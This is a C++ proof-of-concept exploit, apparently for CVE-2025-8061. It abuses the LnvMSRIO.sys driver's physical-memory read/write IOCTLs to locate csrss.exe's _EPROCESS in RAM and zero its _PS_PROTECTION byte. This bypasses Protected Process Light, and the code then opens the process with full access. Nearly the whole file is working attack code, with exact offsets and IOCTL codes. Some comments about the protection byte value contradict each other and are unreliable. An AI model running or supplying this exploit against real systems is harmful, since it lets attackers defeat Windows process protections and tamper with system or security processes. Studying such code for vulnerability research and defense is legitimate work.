/*
 * 03_ppl_bypass.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — PPL Bypass
 *
 * Goal: prove that _PS_PROTECTION can be zeroed via physical write,
 *       allowing OpenProcess(PROCESS_ALL_ACCESS) on a PPL-protected process.
 *
 * Target: csrss.exe
 * ─────────────────
 * csrss.exe (Client/Server Runtime Subsystem) is always running, always
 * PPL-protected (PS_PROTECTED_SIGNER_WINDOWS = 5, PS_PROTECTED_TYPE_PROTECTED = 2
 * → Protection byte = 0x62 on most builds).
 * Before the patch: OpenProcess(PROCESS_ALL_ACCESS, csrss) → ERROR_ACCESS_DENIED (5)
 * After the patch:  OpenProcess(PROCESS_ALL_ACCESS, csrss) → SUCCESS
 * This is the clearest possible before/after proof.
 *
 * Technique (data-only)
 * ─────────────────────
 * 1. Resolve csrss.exe PID via CreateToolhelp32Snapshot.
 * 2. Prove it's protected: OpenProcess fails → print the error.
 * 3. Scan physical RAM for csrss _EPROCESS:
 *      UniqueProcessId == csrss_pid  AND  ImageFileName == "csrss"
 * 4. Read _PS_PROTECTION byte at _EPROCESS + 0x87A.
 *    Decode the byte:
 *      bits [2:0] = Type    (0=None 1=Light 2=Full)
 *      bits [6:3] = Signer  (5=Windows 6=WinTcb 7=Antimalware …)
 * 5. Write 0x00 to that byte → removes all protection.
 * 6. Read back to verify the write stuck.
 * 7. OpenProcess(PROCESS_ALL_ACCESS, csrss) → must succeed now.
 * 8. Read first 16 bytes of csrss VA 0x... (just GetModuleHandle trick) as
 *    extra proof that we have full access.
 * 9. RESTORE _PS_PROTECTION byte to original value (important: not restoring
 *    can cause a BSOD if PatchGuard detects the modified structure, or if
 *    something tries to check the csrss protection level).
 *
 * _PS_PROTECTION layout (single byte):
 * ──────────────────────────────────────
 *   7   6   5   4   3   2   1   0
 *   └── Signer (4 bits) ──┘ └ Type (3 bits) ┘
 *
 *   Type values:
 *     0  PS_PROTECTED_TYPE_NONE
 *     1  PS_PROTECTED_TYPE_PROTECTED_LIGHT  (PPL)
 *     2  PS_PROTECTED_TYPE_PROTECTED         (PP — full protection)
 *
 *   Signer values (relevant ones):
 *     1  PS_PROTECTED_SIGNER_AUTHENTICODE
 *     4  PS_PROTECTED_SIGNER_ANTIMALWARE
 *     5  PS_PROTECTED_SIGNER_WINDOWS
 *     6  PS_PROTECTED_SIGNER_WINTCB
 *     7  PS_PROTECTED_SIGNER_WINTCB (PPL)
 *
 *   csrss.exe: Signer=5 (Windows), Type=2 (Protected) → byte = (5<<3)|2 = 0x2A
 *   Some builds report 0x62 (Signer=0xC/WinTcb, Type=2) — varies.
 *   Either way, zeroing it removes all protection.
 *
 * _EPROCESS offsets (stable Win10 19041 → Win11 26100+)
 * ──────────────────────────────────────────────────────
 *   UniqueProcessId  +0x440
 *   Token            +0x4B8  (not used here)
 *   ImageFileName    +0x5A8  char[15]
 *   Protection       +0x87A  BYTE (_PS_PROTECTION)
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:03_ppl_bypass.exe 03_ppl_bypass.cpp
 *      /link kernel32.lib tlhelp32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── Physical primitives ─────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn  { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; BYTE Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU8(uint64_t pa, uint8_t *out)
{
    PhysReadIn in = { pa, 1, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 1, &got, nullptr)
           && (got == 1);
}

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── Physical RAM upper bound ─────────────────────────────────────────────────

static uint64_t PhysRamTop()
{
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    uint64_t top = ms.ullTotalPhys + (512ULL << 20);
    return (top + 0x1FFFFFULL) & ~0x1FFFFFULL;
}

// ─── _PS_PROTECTION byte constants ───────────────────────────────────────────

static const char *ProtTypeName(uint8_t byte)
{
    switch (byte & 0x07) {
    case 0: return "None";
    case 1: return "PPL (Light)";
    case 2: return "PP (Protected)";
    default: return "Unknown";
    }
}

static const char *ProtSignerName(uint8_t byte)
{
    switch ((byte >> 3) & 0x0F) {
    case 0:  return "None";
    case 1:  return "Authenticode";
    case 4:  return "Antimalware";
    case 5:  return "Windows";
    case 6:  return "WinTcb";
    case 7:  return "WinTcb(PPL)";
    case 8:  return "WinSystem";
    case 12: return "WinTcb(alt)";
    default: return "Unknown";
    }
}

static void PrintProtection(const char *label, uint8_t prot)
{
    printf("  %-20s  0x%02X  [ Type=%-16s  Signer=%s ]\n",
           label, prot, ProtTypeName(prot), ProtSignerName(prot));
}

// ─── EPROCESS scan ───────────────────────────────────────────────────────────

#define EPROC_OFF_PID    0x440u
#define EPROC_OFF_FNAME  0x5A8u
#define EPROC_OFF_PROT   0x87Au   // _PS_PROTECTION byte
#define SCAN_CHUNK       (1u << 20)
#define SCAN_STEP        8u

static uint64_t FindEprocess(DWORD targetPid, const char *targetName)
{
    uint64_t ram_top = PhysRamTop();
    DWORD minTrail = EPROC_OFF_FNAME + 8;

    auto *chunk = (uint8_t *)VirtualAlloc(nullptr, SCAN_CHUNK,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!chunk) return 0;

    uint64_t result = 0;

    for (uint64_t pa = 0x100000ULL; pa < ram_top && !result; pa += SCAN_CHUNK) {
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;

        DWORD readLen = (pa + SCAN_CHUNK <= ram_top)
                        ? SCAN_CHUNK : (DWORD)(ram_top - pa);

        bool any_ok = false;
        for (DWORD pg = 0; pg < readLen; pg += 0x1000) {
            DWORD pl = (readLen - pg < 0x1000u) ? (readLen - pg) : 0x1000u;
            if (PhysRead(pa + pg, chunk + pg, pl)) any_ok = true;
            else memset(chunk + pg, 0, pl);
        }
        if (!any_ok) continue;

        for (DWORD off = 0; off + minTrail <= readLen; off += SCAN_STEP) {
            ULONG_PTR pid = *(ULONG_PTR *)(chunk + off + EPROC_OFF_PID);
            if ((DWORD)pid != targetPid || pid >> 32) continue;

            const char *fname = (const char *)(chunk + off + EPROC_OFF_FNAME);
            if (_strnicmp(fname, targetName, strlen(targetName)) != 0) continue;

            result = pa + off;
            printf("    [scan] \"%-15s\"  PID=%-6lu  PA=0x%016llX\n",
                   fname, (unsigned long)targetPid, result);
            break;
        }
    }

    VirtualFree(chunk, 0, MEM_RELEASE);
    return result;
}

// ─── Get csrss PID ───────────────────────────────────────────────────────────

static DWORD GetCsrssPid()
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe))
        do {
            if (_wcsicmp(pe.szExeFile, L"csrss.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 03 - PPL Bypass (csrss.exe) ===\n\n");

    if (!OpenDevice()) return 1;

    // ── Step 1: find csrss PID ────────────────────────────────────────────────
    DWORD csrss_pid = GetCsrssPid();
    if (!csrss_pid) {
        printf("[-] csrss.exe not found in process list\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] csrss.exe  PID = %lu\n\n", csrss_pid);

    // ── Step 2: prove csrss is protected BEFORE the patch ────────────────────
    printf("[*] OpenProcess BEFORE patch:\n");
    HANDLE hBefore = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrss_pid);
    if (hBefore) {
        // Unexpectedly succeeded — already unprotected or we're SYSTEM already
        printf("    [!] Succeeded (handle=%p) — already unprotected or running as SYSTEM\n",
               hBefore);
        printf("    Nothing to bypass. Exiting.\n");
        CloseHandle(hBefore);
        CloseHandle(g_dev);
        return 0;
    }
    DWORD errBefore = GetLastError();
    printf("    FAILED  error=%lu  (%s)\n\n",
           errBefore,
           errBefore == ERROR_ACCESS_DENIED ? "ERROR_ACCESS_DENIED — protected as expected"
                                             : "unexpected error");

    // ── Step 3: find csrss _EPROCESS in physical memory ──────────────────────
    printf("[*] Scanning physical RAM for csrss _EPROCESS (PID=%lu)...\n", csrss_pid);
    uint64_t eproc_pa = FindEprocess(csrss_pid, "csrss");
    if (!eproc_pa) {
        printf("[-] csrss _EPROCESS not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] csrss _EPROCESS @ PA  0x%016llX\n\n", eproc_pa);

    // ── Step 4: read _PS_PROTECTION byte ─────────────────────────────────────
    uint8_t prot_orig = 0xFF;
    if (!PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_orig)) {
        printf("[-] Failed to read Protection byte\n");
        CloseHandle(g_dev); return 1;
    }
    PrintProtection("Protection (before):", prot_orig);

    if (prot_orig == 0) {
        printf("    [!] Already unprotected — nothing to do\n");
        CloseHandle(g_dev); return 0;
    }

    // ── Step 5: zero out _PS_PROTECTION ──────────────────────────────────────
    printf("\n[*] Writing 0x00 to _PS_PROTECTION...\n");
    if (!PhysWriteU8(eproc_pa + EPROC_OFF_PROT, 0x00)) {
        printf("[-] PhysWriteU8 failed: %lu\n", GetLastError());
        CloseHandle(g_dev); return 1;
    }

    // ── Step 6: read-back verification ───────────────────────────────────────
    uint8_t prot_after = 0xFF;
    PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_after);
    PrintProtection("Protection (after) :", prot_after);

    if (prot_after != 0x00) {
        printf("\n[-] Write did not stick (read-back = 0x%02X)\n", prot_after);
        CloseHandle(g_dev); return 1;
    }
    printf("\n[+] Protection byte cleared!\n\n");

    // ── Step 7: prove bypass with OpenProcess ────────────────────────────────
    // Small delay: the kernel caches the token/protection for in-flight syscalls.
    // 50ms is enough to let any pending checks complete.
    Sleep(50);

    printf("[*] OpenProcess AFTER patch:\n");
    HANDLE hAfter = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrss_pid);
    DWORD  errAfter = GetLastError();

    if (hAfter) {
        printf("    SUCCESS  handle=%p  — PPL is gone!\n\n", hAfter);

        // ── Step 8: extra proof — read first 16 bytes of csrss from its PEB ─
        // GetModuleHandle asks csrss for its own NTDLL base via the PEB.
        // Instead, we do something simpler: ReadProcessMemory on a known VA.
        // csrss's ntdll.dll is at the same VA as ours (shared mapping).
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            uint8_t remote[16] = {};
            SIZE_T  nread = 0;
            BOOL    rmOk = ReadProcessMemory(hAfter, hNtdll, remote, sizeof(remote), &nread);
            if (rmOk && nread == 16) {
                printf("[+] ReadProcessMemory(csrss, ntdll.dll @ %p):\n    ", hNtdll);
                for (int i = 0; i < 16; i++) printf("%02X ", remote[i]);
                printf("\n    (first bytes of csrss's ntdll.dll — read from a PPL process!)\n\n");
            } else {
                printf("    [!] ReadProcessMemory failed: %lu\n\n", GetLastError());
            }
        }
        CloseHandle(hAfter);
    } else {
        printf("    FAILED  error=%lu  — bypass may not have worked\n\n", errAfter);
        printf("    Check: Protection PA=0x%016llX  offset=+0x%X\n",
               eproc_pa, EPROC_OFF_PROT);
        printf("    Hint: Protection offset may differ on this build — verify with WinDbg\n");
        printf("          dt nt!_EPROCESS %llu Protection\n\n", (unsigned long long)csrss_pid);
    }

    // ── Step 9: RESTORE _PS_PROTECTION ───────────────────────────────────────
    //
    // Always restore! PatchGuard (KPP) periodically verifies protection values
    // of certain system processes. Leaving csrss unprotected can trigger a
    // BSOD (0x109 CRITICAL_STRUCTURE_CORRUPTION) within seconds to minutes.
    printf("[*] Restoring _PS_PROTECTION (0x%02X)...\n", prot_orig);
    if (PhysWriteU8(eproc_pa + EPROC_OFF_PROT, prot_orig)) {
        uint8_t prot_restored = 0xFF;
        PhysReadU8(eproc_pa + EPROC_OFF_PROT, &prot_restored);
        PrintProtection("Protection (restored):", prot_restored);
        printf("[+] Restored successfully. BSOD risk eliminated.\n");
    } else {
        printf("[-] RESTORE FAILED — machine may BSOD soon (PatchGuard)\n");
        printf("    Save your work and reboot.\n");
    }

    CloseHandle(g_dev);
    printf("\n[+] Done.\n");
    return 0;
}
